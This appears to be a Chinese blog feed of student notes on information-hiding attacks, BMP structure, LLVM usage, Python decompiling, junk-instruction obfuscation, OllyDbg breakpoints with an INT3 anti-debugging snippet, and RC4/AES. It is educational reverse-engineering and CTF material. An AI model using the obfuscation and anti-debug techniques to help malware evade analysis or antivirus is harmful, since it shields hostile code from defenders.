id="信息隐藏常用攻击方法"><a href="#信息隐藏常用攻击方法" class="headerlink" title="信息隐藏常用攻击方法"></a>信息隐藏常用攻击方法</h4><ol><li><p>隐密分析</p><pre><code> * **感官攻击**</code></pre></li></ol><p>　　感官攻击包括视觉攻击和听觉攻击。是指利用人类感官对媒体模式失真和噪声的辨识能力来判断是否含有隐密信息的一类方法。虽然隐密算法的首要任务就是要使得载体在隐藏信息前后不能被人类的感官察觉，但是由于隐密信息与隐密区域的统计特性不一致，往往会使载体与隐密载体之间产生较大的感官差异，如图像的色彩变化、噪声强度变化等。</p><ul><li><strong>结构攻击</strong></li></ul><p>　　结构攻击是指利用由于信息的隐藏而造成载体原有结构的破坏或特殊结构的引入来判断是否含有隐密信息。比如正常的图像调色板结构中没有或很少有颜色的聚集，但有些隐密算法为了避免视觉攻击，隐藏信息时对调色板进行了缩减、排序等调整，使得调色板中产生大量颜色聚集。</p><ul><li><strong>统计攻击</strong></li></ul><p>　　统计攻击是指利用特征样本分布和理论期望分布的差异性，从而给出含有隐密信息概率的一种分析方法。由于隐密信息的统计特性往往与隐密区。</p><ol start="2"><li>水印攻击</li></ol><ul><li><strong>稳健性攻击</strong></li></ul><p>　　稳健性攻击也称去除攻击，这是最常用的攻击方法。它主要攻击健壮性的数字水印。目的在于除去数据中的水印而不影响图像的使用，比如对图像的一些常用的无恶意的处理方法，如压缩、滤波、缩放、打印和扫描等。常见的健壮性攻击可以分为几方面：有损压缩、信号处理技术。</p><ul><li><strong>表达攻击</strong></li></ul><p>​        表达攻击并不需要除去数字产品中的水印，它是通过操纵内容从而使水印检测器无法检测到水印的存在。这类攻击的一个特点是水印实际上还存在于图像中，但水印检测器已不能提取水印或不能检测水印的存在。几何变换在数字水印攻击中扮演了重要的角色，而且许多数字水印算法都无法抵抗某些重要的几何攻击。常见的几何变换有：水平翻转、剪切、旋转、缩放、行／列删除、变通几何变换、打印一扫描处理和随机几何变形。</p><ul><li><strong>解释攻击</strong></li></ul><p>　　解释攻击既不试图擦除水印，也不试图使水印检测无效，而是试图对水印的所有权产生争议，比如一个攻击者试图在一个嵌入了水印的图像中再次嵌入另一个水印，所以导致了所有权的争议。</p><ul><li><strong>合法攻击</strong></li></ul><p>　　合法攻击也称法律攻击。它与前三种攻击不同，前三种攻击可以称为技术性攻击，而合法攻击可能包括现有的及将来的有关版权和有关数字信息所有权的法案，因为在不同的司法权限中，这些法律可能有不同的解释。如攻击者希望在法庭上利用此类攻击，它们的攻击是在水印方案所提供的技术或科学证据之外而进行的。</p><h3 id="2-3：手工演练基于-BMP-图像的信息隐藏与提取过程任务"><a href="#2-3：手工演练基于-BMP-图像的信息隐藏与提取过程任务" class="headerlink" title="2.3：手工演练基于 BMP 图像的信息隐藏与提取过程任务"></a>2.3：手工演练基于 BMP 图像的信息隐藏与提取过程任务</h3><p>[(50条消息) BMP 图像信息隐藏及检测_苏浅时的博客-CSDN博客_bmp图像信息隐藏](<a href="https://blog.csdn.net/weixin_44558065/article/details/112556436?ops_request_misc=%7B%22request_id%22:%22166547262916782391845752%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&amp;request_id=166547262916782391845752&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-112556436-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Eadd_ask&amp;utm_term=BMP">https://blog.csdn.net/weixin_44558065/article/details/112556436?ops_request_misc=%7B%22request%5Fid%22%3A%22166547262916782391845752%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166547262916782391845752&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-112556436-null-null.142^v52^js_top,201^v3^add_ask&amp;utm_term=BMP</a> 图像的信息隐藏与提取&amp;spm=1018.2226.3001.4187)</p><h3 id="2-4-5：BMP-图像文件的读取任务"><a href="#2-4-5：BMP-图像文件的读取任务" class="headerlink" title="2.4-5：BMP 图像文件的读取任务"></a>2.4-5：BMP 图像文件的读取任务</h3><h4 id="BMP图像的基本知识"><a href="#BMP图像的基本知识" class="headerlink" title="BMP图像的基本知识"></a>BMP图像的基本知识</h4><ol><li><strong>BMP概念</strong></li></ol><p>​        BMP是英文Bitmap（位图）的简写，它是Windows操作系统中的标准图像文件格式，能够被多种Windows应用程序所支持。优点是：包含的图像信息较丰富，几乎不进行压缩，缺点是：占用磁盘空间较大，在单机上比较流行。</p><p>​        BMP位图文件默认的<strong>文件扩展名</strong>是BMP或者bmp（有时它也会以.DIB或.RLE作扩展名）</p><ol start="2"><li><p><strong>BMP格式结构(从文件头开始)</strong></p><ul><li>**位图文件头(bmp file header)**：提供文件的格式、大小等信息</li><li>**位图信息头(bitmap information)**：提供图像数据的尺寸、位平面数、压缩方式、颜色索引等信息</li><li>**调色板(color palette)**：可选，如使用索引来表示图像，调色板就是索引与其对应的颜色的映射表</li><li>**位图数据(bitmap data)**：图像数据区</li></ul><p><strong>BMP图片文件数据表如下</strong>：</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-3.png" alt="信息隐藏-3"></p></li><li><p><strong>BMP文件头结构体定义</strong>：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">typedef struct tagBITMAPFILEHEADER&#123; UINT16 bfType;        &#x2F;&#x2F;2Bytes，必须为&quot;BM&quot;，即0x424D 才是Windows位图文件DWORD bfSize;         &#x2F;&#x2F;4Bytes，整个BMP文件的大小UINT16 bfReserved1;  &#x2F;&#x2F;2Bytes，保留，为0UINT16 bfReserved2;  &#x2F;&#x2F;2Bytes，保留，为0DWORD bfOffBits;     &#x2F;&#x2F;4Bytes，文件起始位置到图像像素数据的字节偏移量&#125; BITMAPFILEHEADER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        <strong>BMP文件头数据表如下</strong>：</p><p>​        <img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\4.png" alt="4"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\5.png" alt="5"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\6.png" alt="6"></p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\7.png" alt="7"></p><ol start="4"><li><strong>BMP信息头结构体定义如下</strong>：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">typedef struct _tagBMP_INFOHEADER &#123; DWORD  biSize;    &#x2F;&#x2F;4Bytes，INFOHEADER结构体大小，存在其他版本I NFOHEADER，用作区分 LONG   biWidth;    &#x2F;&#x2F;4Bytes，图像宽度（以像素为单位） LONG   biHeight;    &#x2F;&#x2F;4Bytes，图像高度，+：图像存储顺序为Bottom2Top，-：Top2Bottom WORD   biPlanes;    &#x2F;&#x2F;2Bytes，图像数据平面，BMP存储RGB数据，因此总为1 WORD   biBitCount;         &#x2F;&#x2F;2Bytes，图像像素位数 DWORD  biCompression;     &#x2F;&#x2F;4Bytes，0：不压缩，1：RLE8，2：RLE4 DWORD  biSizeImage;       &#x2F;&#x2F;4Bytes，4字节对齐的图像数据大小 LONG   biXPelsPerMeter;   &#x2F;&#x2F;4 Bytes，用象素&#x2F;米表示的水平分辨率 LONG   biYPelsPerMeter;   &#x2F;&#x2F;4 Bytes，用象素&#x2F;米表示的垂直分辨率 DWORD  biClrUsed;          &#x2F;&#x2F;4 Bytes，实际使用的调色板索引数，0：使用所有的调色板索引 DWORD biClrImportant;     &#x2F;&#x2F;4 Bytes，重要的调色板索引数，0：所有的调色板索引都重要 &#125;BMP_INFOHEADER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>BMP信息头数据表如下</strong>：</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\8.png" alt="8"></p><ol start="5"><li><strong>BMP调色板结构体定义如下</strong>：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">typedef struct _tagRGBQUAD&#123;    BYTE  rgbBlue;       &#x2F;&#x2F;指定蓝色强度    BYTE  rgbGreen;      &#x2F;&#x2F;指定绿色强度    BYTE  rgbRed;        &#x2F;&#x2F;指定红色强度    BYTE  rgbReserved;  &#x2F;&#x2F;保留，设置为0&#125; RGBQUAD;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        1，4，8位图像才会使用调色板数据，16,24,32位图像不需要调色板数据，即调色板最多只需要256项（索引0 - 255）。</p><p>​        颜色表的大小根据所使用的颜色模式而定：2色图像为8字节；16色图像位64字节；256色图像为1024字节。其中，每4字节表示一种颜色，并以B（蓝色）、G（绿色）、R（红色）、alpha（32位位图的透明度值，一般不需要）。即首先4字节表示颜色号1的颜色，接下来表示颜色号2的颜色，依此类推。</p><p>​        颜色表中RGBQUAD结构数据的个数有biBitCount来确定，当biBitCount=1,4,8时，分别有2,16,256个表项。</p><p>​        当biBitCount=1时，为2色图像，BMP位图中有2个数据结构RGBQUAD，一个调色板占用4字节数据，所以2色图像的调色板长度为2*4为8字节。</p><p>​        当biBitCount=4时，为16色图像，BMP位图中有16个数据结构RGBQUAD，一个调色板占用4字节数据，所以16像的调色板长度为16*4为64字节。</p><p>​        当biBitCount=8时，为256色图像，BMP位图中有256个数据结构RGBQUAD，一个调色板占用4字节数据，所以256色图像的调色板长度为256*4为1024字节。</p><p>​        当biBitCount=16，24或32时，没有颜色表。</p><p><strong>BMP图像数据区</strong>:</p><p>​        位图数据记录了位图的每一个像素值，记录顺序是在扫描行内是从左到右,扫描行之间是从下到上。位图的一个像素值所占的字节数:</p><p>​        当biBitCount=1时，8个像素占1个字节;</p><p>​        当biBitCount=4时，2个像素占1个字节;</p><p>​        当biBitCount=8时，1个像素占1个字节;</p><p>​        当biBitCount=24时,1个像素占3个字节;</p><p>​        Windows规定一个扫描行所占的字节数必须是4的倍数(即以long为单位),不足的以0填充，</p><p>一个扫描行所占的字节数计算方法:</p><p>​        DataSizePerLine= (biWidth* biBitCount+31)/8;// 一个扫描行所占的字节数</p><p>​        DataSizePerLine= DataSizePerLine/4*4; // 字节数必须是4的倍数位图数据的大小(不压缩情况下):</p><p>​        DataSize= DataSizePerLine* biHeight;</p><p>​        颜色表接下来位为位图文件的图像数据区，在此部分记录着每点像素对应的颜色号，其记录方式也随颜色模式而定，既2色图像每点占1位（8位为1字节）；16色图像每点占4位（半字节）；256色图像每点占8位（1字节）；真彩色图像每点占24位（3字节）。所以，整个数据区的大小也会随之变化。究其规律而言，可的出如下计算公式：图像数据信息大小=（图像宽度<em>图像高度</em>记录像素的位数）/8</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM-Clang编译器安装和使用</title>
      <link href="/2022/031262045.html"/>
      <url>/2022/031262045.html</url>
      
        <content type="html"><![CDATA[<p>转载于：<a href="L1uis1'sblog">L1uis1’sblog</a></p><article class="post-content" id="article-container"><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><ol><li>apt-get install clang</li></ol></blockquote><blockquote><ol start="2"><li>apt-get install llvm</li></ol></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="LLVM-IR文件"><a href="#LLVM-IR文件" class="headerlink" title="LLVM IR文件"></a>LLVM IR文件</h2><ol><li><p>使用clang将C源码转换为LLVM IR(文本形式)：</p><blockquote><p>clang -emit-llvm -S test.c -o test.ll / clang -O3 -emit-llvm test.c -S -o test.ll</p></blockquote></li><li><p>使用clang将C源码转换为LLVM IR(二进制形式)：</p><blockquote><p>clang -emit-llvm test.c -c -o test.bc / clang -O3 -emit-llvm test.c -c -o test.bc</p></blockquote></li><li><p>LLVM IR文件格式转换(.bc和.ll文件的转换)</p><blockquote><p>llvm-as test.ll -o test.bc     //llvm .ll -&gt; .bc assembler<br>llvm-dis test.bc -o test.ll  //llvm .bc -&gt; .ll disassembler</p></blockquote></li><li><p>将LLVM字节码转换为机器汇编码</p><blockquote><p>llc test.bc -o test.s</p></blockquote></li><li><p>由LLVM IR生成对应的可执行文件</p><blockquote><p>llc -filetype=obj test.ll -o test.o<br>gcc test.o<br>或者<br>llc -filetype=obj test.bc -o test.o<br>gcc test.o</p></blockquote></li></ol><p>注：生成可执行文件时，若出现如下或类似的报错</p><figure class="highlight bash"><div class="highlight-tools "><i class="fas fa-angle-down expand "></i><div class="code-lang">bash</div><div class="copy-notice"></div><i class="fas fa-paste copy-button"></i></div><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: test.o: relocation R_X86_64_32 against symbol `what<span class="string">' can not be used when making a PIE object; recompile with -fPIE</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br></pre></td></tr></tbody></table></figure><p>使用</p><blockquote><p>clang++  test.o -o test</p></blockquote></article>  ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="/2022/030533794.html"/>
      <url>/2022/030533794.html</url>
      
        <content type="html"><![CDATA[<h1 id="python逆向"><a href="#python逆向" class="headerlink" title="python逆向"></a>python逆向</h1><h2 id="附件为py文件"><a href="#附件为py文件" class="headerlink" title="附件为py文件"></a>附件为py文件</h2><p>直接看源代码分析</p><h2 id="附件为pyc文件"><a href="#附件为pyc文件" class="headerlink" title="附件为pyc文件"></a>附件为pyc文件</h2><ul><li>在线网址反编译：<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></li><li>使用uncompyle6<ul><li>安装：pip install uncompyle6</li><li>使用：uncompyle6 -o test.py test.pyc</li></ul></li></ul><h2 id="附件为打包的exe文件"><a href="#附件为打包的exe文件" class="headerlink" title="附件为打包的exe文件"></a>附件为打包的exe文件</h2><ul><li>使用Pyinstaller打包<ul><li>安装：<a href="https://sourceforge.net/projects/pyinstallerextractor/">PyInstaller Extractor download | SourceForge.net</a></li><li>使用：python pyinstxtractor.py test.exe</li></ul></li><li>使用py2exe打包<ul><li>安装unpy2exe：pip install unpy2exe</li><li>使用：unpy2exe.py -o test test.exe</li></ul></li></ul><h2 id="python字节码"><a href="#python字节码" class="headerlink" title="python字节码"></a>python字节码</h2><p>根据官方文档慢慢翻译</p><p><a href="https://docs.python.org/zh-cn/3/library/dis.html?highlight=dis">dis — Python 字节码反汇编器 — Python 3.10.1 文档</a>  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>花指令及迷宫问题</title>
      <link href="/2022/03051961.html"/>
      <url>/2022/03051961.html</url>
      
        <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><h2 id="什么是花指令"><a href="#什么是花指令" class="headerlink" title="什么是花指令"></a>什么是花指令</h2><p>​花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑。在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的，本文将介绍一些常见的花指令的形式，花指令一般被分为两类，被执行的和不会被执行的。</p><p>​花指令是企图隐藏掉不想被逆向工程的代码块 (或其它功能) 的一种方法, 在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行, 而程序无法很好地反编译, 难以理解程序内容, 达到混淆视听的效果.</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>产生花指令的根本原因是x86指令集由不定长指令构成<br>当通过跳转使执行流命中到另一条指令的中间时就会造成静态反汇编的解析错误</p><p>现代反汇编器有两种思路：</p><p>线性扫描<br>从开头到结尾依次读取机器码并进行反汇编<br>递归下降<br>从程序入口向后反汇编，遇到条件跳转则分别从分支的地方继续反汇编，无条件跳转则尝试从目的指令继续反汇编<br>线性扫描显然很容易制造花指令，只要在跳转和目标之间插入长度较长的指令开头（例如E8，后接4个字节）即可使之后的所有指令解析错误。OllyDbg和windbg就是使用的线性扫描法</p><p>而递归下降则可以避开这种简单的花指令，跳过中间的脏字节。但对于一些针对性的花指令–例如jz+jnz+脏字节，则会由于上下文无关的算法而对脏字节进行解析</p><p>除此以外还有把call当jmp使用的手段，由于在编译器中call只会用来作为子程序/函数跳转的指令，因此IDA往往会将call的地址视作一个函数的起始地址，进而破坏整个函数的完整性</p><h2 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h2><ol><li><p>jx+jnx</p></li><li><p>call+pop/add esp/add [esp] + retn</p></li><li><p>stx/jx</p></li><li><p>循环跳转花指令  </p></li></ol><h2 id="如何去除花指令"><a href="#如何去除花指令" class="headerlink" title="如何去除花指令"></a>如何去除花指令</h2><p>   根据程序需要修改或者nop掉，具体问题具体分析  </p><h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><p>迷宫问题有以下特点:</p><ul><li>在内存中布置一张 “地图”</li><li>将用户输入限制在少数几个字符范围内.</li><li>一般只有一个迷宫入口和一个迷宫出口</li></ul><p>​布置的地图可以由可显字符 (比如<code>#</code>和<code>*</code>)组合而成 (这非常明显, 查看字符串基本就知道这是个迷宫题了.), 也可以单纯用不可显的十六进制值进行表示. 可以将地图直接组成一条非常长的字符串, 或是一行一行分开布置. 如果是一行一行分开布置的话, 因为迷宫一般都会比较大, 所以用于按行(注意, 布置并非按顺序布置, 每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显重复多次.</p><p>​而被限制的字符通常会是一些方便记忆的组合 (不是也没办法), 比如<code>w/s/a/d</code>, <code>h/j/k/l</code>, <code>l/r/u/d</code>这样的类似组合. 当然各个键具体的操作需要经过分析判断 (像那种只用一条字符串表示迷宫的, 就可以用<code>t</code>键表示向右移动<code>12</code>个字符这样). 对于二维的地图, 一般作者都会设置一个<code>X坐标</code>和一个<code>Y坐标</code>用于保存当前位置. 我们也可以根据这个特点来入手分析.</p><p>​一般情况下, 迷宫是只有 1 个入口和 1 个出口, 像入口在最左上角<code>(0, 0)</code>位置, 而出口在最右下角<code>(max_X, max_Y)</code>处. 但也有可能是出口在迷宫的正中心, 用一个<code>Y</code>字符表示等等. 解答迷宫题的条件也是需要根据具体情况判断的.</p><p>​当然迷宫的走法可能不止 1 条, 也有情况是有多条走法, 但是要求某一个走法比如说代价最小. 那么这就可以变相为一个算法问题.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>od使用</title>
      <link href="/2022/011152450.html"/>
      <url>/2022/011152450.html</url>
      
        <content type="html"><![CDATA[<h2 id="od部分原理"><a href="#od部分原理" class="headerlink" title="od部分原理"></a>od部分原理</h2><h3 id="常见断点之INT3断点原理"><a href="#常见断点之INT3断点原理" class="headerlink" title="常见断点之INT3断点原理"></a>常见断点之INT3断点原理</h3><ol><li>原理<br>F2断点又叫做CC断点（INT3）断点。<br>01 替换指令，也就是替换int3指令<br>02 od检测到int3指令之后会产生一个异常处理并捕获它，这时候程序就会中断<br>03 od删除int3指令，还原之前代码  </li><li>优点<br>可以无限下int3断点  </li><li>缺点<br>太容易被检测到  </li></ol><h3 id="INT3断点的反调试与反反调试"><a href="#INT3断点的反调试与反反调试" class="headerlink" title="INT3断点的反调试与反反调试"></a>INT3断点的反调试与反反调试</h3><ol><li><p>知识点<br>01 FARPROC结构体<br>02 GetprocAddress()函数:检索指定的动态链接库(DLL)中的输出库函数地址。<br>03 LoadLibrary()函数:将指定的模块加载到调用进程的地址空间中。指定的模块可能会导致其他模块被加载。对于其他加载选项，请使用 LoadLibraryEx函数。  </p></li><li><p>函数原型<br>GetprocAddress()函数原型：</p><pre><code class="c"> FARPROC GetProcAddress(       HMODULE   hModule,    // DLL模块句柄       LPCSTR       lpProcName   // 函数名   );  </code></pre></li><li><p>代码  </p><pre><code class="c"> #include &lt;iostream&gt; #include &lt;Windows.h&gt; int main() &#123;     FARPROC addr = GetProcAddress(LoadLibrary(L&quot;user32.dll&quot;), &quot;MessageBoxA&quot;);     byte byteAdder = *(byte*)addr;     ::MessageBoxA(NULL, &quot;内容&quot;, &quot;标题&quot;, MB_OK);//调用MessageBoxA()     if (byteAdder == 0xCC) &#123;         printf(&quot;检测到非法调试&quot;);     &#125;     else &#123;         printf(&quot;程序正常运行&quot;);     &#125;     getchar(); &#125;  </code></pre></li><li><p>反调试<br>未进行调试时:<br><img src="/2022/011152450/1.png" alt=" "><br>对MessageBoxA()进行下断点:<br><img src="/2022/011152450/2.png" alt=" ">  </p></li><li><p>反反调试<br>在MessageBoxA()下面一行代码下INT3断点<br><img src="/2022/011152450/3.png" alt=" "><br><img src="/2022/011152450/1.png" alt=" ">  </p></li></ol><h3 id="常用断点之硬件断点"><a href="#常用断点之硬件断点" class="headerlink" title="常用断点之硬件断点"></a>常用断点之硬件断点</h3><ol><li>调试寄存器<br>DR0–DR7<br>DR0–DR3 :保存断点地址 ;DR4–DR5 ;DR6 :状态寄存器 ;DR7 :控制寄存器  </li><li>原理<br>DR0–DR3 :保存下硬件断点的地址<br>DR7 :设置相对应的控制位<br>当运行到此位置是会发送一个异常信息，导致程序中断，等待用户操作  </li><li>优点 ：不易被检测，速度快<br>缺点 : 只能下四个断点  </li></ol><h3 id="常用断点之内存断点"><a href="#常用断点之内存断点" class="headerlink" title="常用断点之内存断点"></a>常用断点之内存断点</h3><ol><li>原理<br>在该位置下内存断点，导致该位置赋予不可读、不可写、不可执行的属性，从而运行到此处时发送异常，导致程序中断。  </li><li>优点：不改变汇编代码<br>缺点：无  </li></ol><h3 id="常见断点之消息断点"><a href="#常见断点之消息断点" class="headerlink" title="常见断点之消息断点"></a>常见断点之消息断点</h3><ol><li>原理<br>当点击或者处理一个事件时，会形成消息，想内核发送，内核进行识别并做出相应的处理  </li></ol><h3 id="常见断点之条件断点"><a href="#常见断点之条件断点" class="headerlink" title="常见断点之条件断点"></a>常见断点之条件断点</h3><ol><li>触发：shirt+F2  </li><li>类似int3断点，只是要加条件断  </li><li>多条件用&amp;&amp;，|| 连接符  </li></ol><h3 id="内存一次性断点和条件记录断点"><a href="#内存一次性断点和条件记录断点" class="headerlink" title="内存一次性断点和条件记录断点"></a>内存一次性断点和条件记录断点</h3><ol><li>内存一次性断点：alt+m，断点原理是int3断点原理，但是只能用一次  </li><li>条件记录断点：shirt+F4，类似条件断点，但是alt+l可以查看断点位置特定寄存器等的值  </li></ol><h3 id="hit-trace-和-run-trace"><a href="#hit-trace-和-run-trace" class="headerlink" title="hit trace 和 run trace"></a>hit trace 和 run trace</h3><ol><li>原理 int3断点原理  </li><li>run trace 记录数据</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码类型及加密解密算法</title>
      <link href="/2021/120547052.html"/>
      <url>/2021/120547052.html</url>
      
        <content type="html"><![CDATA[<h2 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h2><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>对称加密算法，也就是说使用的密钥为单钥（或称为私钥）。就是明文加密和密文解密用的是同一种秘钥<br>例如:  </p><h4 id="rc4加密算法"><a href="#rc4加密算法" class="headerlink" title="rc4加密算法"></a>rc4加密算法</h4><ol><li>说明：rc4加密是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密，同时密钥的长度是可以变的，对于现在仍然有很强的保护性  </li><li>原理：根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说明文的长度是500字节，那么密钥流也是500字节。当然，加密生成的密文也是500字节，因为密文第i字节=明文第i字节^密钥流第i字节。而生成密钥流需要用到状态向量（S），临时向量（T），密钥（K）即：  <ul><li>状态向量S：长度为256，S[0],S[1]…..S[255]。每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换  </li><li>临时向量T：长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T  </li><li>密钥K：长度为1-256字节，注意密钥的长度keylen与明文长度、密钥流的长度没有必然关系，通常密钥的长度趣味16字节（128比特）  <ul><li>初始化S和T<br>for i in range(256) :<br>s[i] = i<br>T[i]=Key[i%len(key)] (key是密钥)  </li><li>初始排列S<br>j = 0<br>for i in range(256) :<br>j = (j + s[i] + T[i]) % 256<br>s[i], s[j] = s[j], s[i]  </li><li>产生密钥流K<br>i = 0<br>j = 0<br>for r in range(len(message)) :<br>i = (i + 1) % 256<br>j = (j + s[i]) % 256<br>s[i], s[j] = s[j], s[i]<br>t = (S[i] + S[j]) % 256<br>K[t] = S[t] (K即是密钥流)  </li><li>脚本：  </li></ul></li></ul></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">def encrypt(tmp, message):      tmp &#x3D; list(map(lambda x: ord(x), tmp))      message &#x3D; list(map(lambda x: ord(x), message))       S &#x3D; list(range(0, 256))      key &#x3D; []  # 存储秘钥流      T &#x3D; []  # 临时向量T       while len(T) &lt; 256:          T.extend(tmp)      while len(T) !&#x3D; 256:          T.pop()       j &#x3D; 0      for i in range(0, 256):          j &#x3D; (j + S[i] + T[i]) % 256          S[i], S[j] &#x3D; S[j], S[i]       i, j &#x3D; 0, 0      for i in range(len(message)):          i &#x3D; (i + 1) % 256          j &#x3D; (j + S[i]) % 256          S[i], S[j] &#x3D; S[j], S[i]          t &#x3D; (S[i] + S[j]) % 256          key.append(S[t])       secretary &#x3D; list(map(lambda x, y: chr(x ^ y), message, key))      return secretary, key  def decrypt(secretary, key):      message &#x3D; list(map(lambda x, y: chr((ord(x)) ^ y), secretary, key))      return &#39;&#39;.join(message)  if __name__ &#x3D;&#x3D; &#39;__main__&#39;:      t &#x3D; list(input(&quot;请输入初始秘钥：&quot;))      m &#x3D; list(input(&quot;请输入需要加密的明文：&quot;))      s, k &#x3D; encrypt(t, m)      print(encrypt(t, m)) # t即为所求     print(&#39;经过加密解密后得到的明文：&#39;, decrypt(s, k))  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AES加密算法"><a href="#AES加密算法" class="headerlink" title="AES加密算法"></a>AES加密算法</h4><ol><li>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：<br><img src="/2021/120547052/1.png" alt=" "><br>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。   AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br> <img src="/2021/120547052/2.png" alt=" "><br> 其主要加密如下(10次加密图)：<br> <img src="/2021/120547052/3.png" alt=" "><br> 其中:  <ul><li>K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。  </li></ul></li></ol><ul><li>字节代换：  </li></ul><ol><li><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。<br>AES的S盒：<br><img src="/2021/120547052/4.png" alt=" "><br>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。<br>逆字节代换也就是查逆S盒来变换，逆S盒如下：<br><img src="/2021/120547052/5.png" alt=" ">  </p></li><li><p>计算方式进行字节代换<br>AES算法中定义的加法和乘法<br>加法：两个字节相加，其和为两个字节按比特异或的结果<br>乘法：两个字节相乘，其积为对应多项式的乘积模二元域GF(2)上的8次不可约多项式m(x)==x^8⊕x^4⊕x^3⊕x⊕1后的结果所对应的字节<br>例如：<br><img src="/2021/120547052/47.png" alt=" "><br>再者<br><img src="/2021/120547052/48.png" alt=" ">  